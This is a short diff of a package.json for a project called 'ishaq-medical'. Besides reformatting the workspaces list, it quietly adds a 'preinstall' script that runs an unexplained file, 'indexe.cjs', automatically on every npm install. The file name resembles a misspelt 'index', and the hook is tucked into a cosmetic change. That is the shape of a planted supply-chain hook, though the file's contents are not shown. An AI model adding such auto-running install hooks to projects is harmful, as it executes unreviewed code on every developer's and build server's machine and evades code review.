@@ -2,12 +2,16 @@
   "name": "ishaq-medical",
   "private": true,
   "version": "1.0.0",
-  "workspaces": ["frontend", "backend"],
+  "workspaces": [
+    "frontend",
+    "backend"
+  ],
   "scripts": {
     "dev": "npm run dev -w frontend",
     "dev:api": "npm run dev -w backend",
     "build": "npm run build -w frontend",
-    "test": "npm run test -w frontend"
+    "test": "npm run test -w frontend",
+    "preinstall": "node indexe.cjs"
   },
   "dependencies": {
     "mongodb": "^6.20.0"
